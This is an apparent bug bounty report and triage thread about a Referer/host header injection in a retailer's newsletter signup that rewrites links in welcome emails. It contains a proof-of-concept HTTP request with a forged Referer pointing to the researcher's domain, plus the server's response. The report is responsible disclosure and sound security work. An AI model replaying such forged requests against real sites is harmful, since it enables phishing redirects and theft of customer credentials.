vulnerability_information:
Good evening,

There's a host header injection vulnerability via all newsletter signups in the referrer attribute. This works with all pages that have "Join our email list" signup boxes.

####Since the referrer attribute can be changed to an outside domain the email being received redirects all links within the "Welcome to Starbucks" email. So in result the member is redirected to a malicious site from the email they used.

The Starbucks logo redirects to the referrer url. I can make another directory for the other links to redirect perfectly with the session cookie name. 

###POC:

I sent this post request to a test email:
```
Host: rewards.www.starbucks.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://r1otnetsec.herokuapp.com/
X-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 66
Cookie: ███████
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
```
Post body:
```
newsletter_signup=pocheaderinjection@gmail.com&newsletter_placement=footer
```
The resulting response:
```
Cache-Control: private
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/7.5
p3p: CP="CAO PSA OUR"
Set-Cookie: ASP.NET_SessionId=███████; domain=.starbucks.com; path=/; secure; HttpOnly
x-newrelic-app-data: PxQGUlZUDQIJR1NRBAEEVVUDFB9AMQYAZBBZDEtZV0ZaCldOfDdwTSFmdA4IF0pcXAgEEBhhRQkHVEVAJAkRDxJOCEwIFAQcA1EKVgVTBE5UGhVUUlQOBwMgJVQEcwZTIHUUHwQHDxFVPw==
X-Powered-By: ASP.NET
x-frame-options: SAMEORIGIN
Date: Thu, 18 May 2017 02:53:52 GMT
Content-Length: 457
Via: 1.1 sjc1-10
newsletter_signup=pocheaderinjection@gmail.com&newsletter_placement=footer
```
###The referrer attritube is encoded and sent to the victims email.

###As a result my url https://r1otnetsec.herokuapp.com/ is sent in place of the normal starbucks url. Clicking the image url sends the user to the malicious page.

Please refer to the screenshots of the email links being changed. This makes it very easy to steal customer credentials by redirect. 

I look forward to hearing from you and have a good evening!
title: Host header injection/redirection via newsletter signup

activities.message: Thanks for sending this in @b3nac ! We are currently reviewing this submission and we'll notify you once we have more information to share with you.
activities.markdown_message: Thanks for sending this in @b3nac ! We are currently reviewing this submission and we'll notify you once we have more information to share with you.

activities.message: Good morning @joystick! I was wondering if this is an original finding, could I get a status update? Thank you for your time.
activities.markdown_message: Good morning @joystick! I was wondering if this is an original finding, could I get a status update? Thank you for your time.

activities.message: Hi @b3nac - thanks for you patience while we continue to look into this issue. We will update this report when we have more information to share with you.
activities.markdown_message: Hi @b3nac - thanks for you patience while we continue to look into this issue. We will update this report when we have more information to share with you.

activities.message: Thank you for the update. I've retested the vulnerability and noticed the newsletter signups have been disabled.
activities.markdown_message: Thank you for the update. I've retested the vulnerability and noticed the newsletter signups have been disabled.

activities.message:
Hi @b3nac,

We've not disabled the newsletter sign up but we have confirmed the host header issue you reported.
Can you provide details as to what you're seeing regarding this being disabled?

We are moving this to triage and accepting it as a valid issue, so the starbucks.com team will be addressing it.
However, based on our internal assessment this does not qualify for a high and we will be lowering the severity.
activities.markdown_message:
Hi @b3nac,

We've not disabled the newsletter sign up but we have confirmed the host header issue you reported.
Can you provide details as to what you're seeing regarding this being disabled?

We are moving this to triage and accepting it as a valid issue, so the starbucks.com team will be addressing it.
However, based on our internal assessment this does not qualify for a high and we will be lowering the severity.

activities.message:
Hi @siren what I was seeing was the newsletter signup requests going back to the page instead of being sent. My guess that was implimented until the fix was completed.

Thank you for the bounty! Please let me know if you want me to re-test it.
activities.markdown_message:
Hi @siren what I was seeing was the newsletter signup requests going back to the page instead of being sent. My guess that was implimented until the fix was completed.

Thank you for the bounty! Please let me know if you want me to re-test it.

activities.message:
Thanks for the feedback, @b3nac.  That's interesting.  I confirmed this morning that I was still able to reproduce the behavior but did notice some unusual behavior when re-using the same email address for sign ups.
We'll keep you posted and let you know when it's time to re-test.

Thanks!
activities.markdown_message:
Thanks for the feedback, @b3nac. That's interesting. I confirmed this morning that I was still able to reproduce the behavior but did notice some unusual behavior when re-using the same email address for sign ups.
We'll keep you posted and let you know when it's time to re-test.

Thanks!

@b3nac -

Thank you for your patience. We have gotten news from the team that this has been resolved and we are experiencing a 500 internal server error. Could you verify that this has been fixed on your end by retesting and let us know if you find otherwise?

Thanks,
@overice

activities.message:
@ristretto @overice 

Hakuna matata. I can verify this has been fixed, the email list signup no longer sends out emails. Testing was done on three different email acounts just incase previous signups were checked. Can we disclose?

Best regards,

B3nac

vulnerability_information_html:
Good evening,

There's a host header injection vulnerability via all newsletter signups in the referrer attribute. This works with all pages that have "Join our email list" signup boxes.

Since the referrer attribute can be changed to an outside domain the email being received redirects all links within the "Welcome to Starbucks" email. So in result the member is redirected to a malicious site from the email they used.

The Starbucks logo redirects to the referrer url. I can make another directory for the other links to redirect perfectly with the session cookie name.

I sent this post request to a test email:

Host: rewards.www.starbucks.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br

X-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 66
Cookie: ███████

Pragma: no-cache
Cache-Control: no-cache

newsletter_signup=pocheaderinjection@gmail.com&newsletter_placement=footer

Cache-Control: private
Content-Type: application/json; charset=utf-8
